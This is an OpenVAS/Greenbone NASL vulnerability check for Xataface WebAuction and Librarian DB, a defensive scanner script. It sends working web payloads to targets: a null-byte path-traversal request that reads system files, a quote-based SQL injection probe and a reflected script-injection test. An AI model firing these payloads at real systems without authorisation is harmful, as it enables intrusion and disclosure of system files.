# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801981");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-09-09 17:36:48 +0200 (Fri, 09 Sep 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Xataface WebAuction and Xataface Librarian DB Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secpod.org/blog/?p=350");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17813");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_Xataface_Webauction_Mult_Vuln.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to execute
  arbitrary HTML code in a user's browser session in the context of a vulnerable
  application or to manipulate SQL queries by injecting arbitrary SQL code or to
  include arbitrary files from external and local resources.");

  script_tag(name:"affected", value:"Xataface WebAuction Version 0.3.6 and prior.

  Xataface Librarian DB version 0.2 and prior.");

  script_tag(name:"insight", value:"Multiple flaws are due to  input passed to the,

  - '-action' parameter in 'index.php' is not properly verified. This can be
  exploited to read complete installation path.

  - 'list&-table' and '-action' parameter in 'index.php' page is not properly
  verified before being used in an SQL query. This can  be exploited to
  manipulate SQL queries by injecting arbitrary SQL queries.

  - '-action' and 'list&-table' parameter in 'index.php'  page is not properly
  verified before it is returned to the user. This can be exploited to
  execute arbitrary HTML and script code in a user's browser session in the
  context of a vulnerable site.

  - 'list&-lang' and '-table' parameter in 'index.php' page is not properly
  verified before it is returned to the user. This can be exploited to
  execute arbitrary HTML and script code in a user's browser session in the
  context of a vulnerable site.

  - 'list&-lang' parameter in 'index.php' is not properly verified before
  using it to include files. This can be exploited to include arbitrary
  files from external and local resources.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Xataface WebAuction/Librarian DB is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);

if (!http_can_host_php(port:port)){
  exit(0);
}

vt_strings = get_vt_strings();

foreach dir (make_list_unique("/webauction", "/librariandb", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/index.php", port:port);

  if('>WebAuction</' >< res || "Books - Dataface Application<" >< res)
  {
    files = traversal_files();
    foreach file (keys(files))
    {
      url = string(dir, "/index.php?-table=books&-action=browse_by_cat&-curs" +
                   "or=0&-skip=0&-limit=30&-mode=list&-lang=../../../../../." +
                   "./../../../", files[file],'%00');

      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        report = http_report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
    }

    url = string(dir,"/index.php?-table='");
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port,data:req);

    if("The mysql error returned was" >< res)
    {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }

    url = string(dir, '/index.php?-table=books&-action=browse_' +
                      'by_cat&-cursor=0&-skip=0&-limit=30&-mode=list&-lang="<sc' +
                      'ript>alert("', vt_strings["default"], '")</script>');
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port,data:req);

    if(res =~ "^HTTP/1\.[01] 200" && '<script>alert("' + vt_strings["default"] + '")</script>' >< res)
    {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
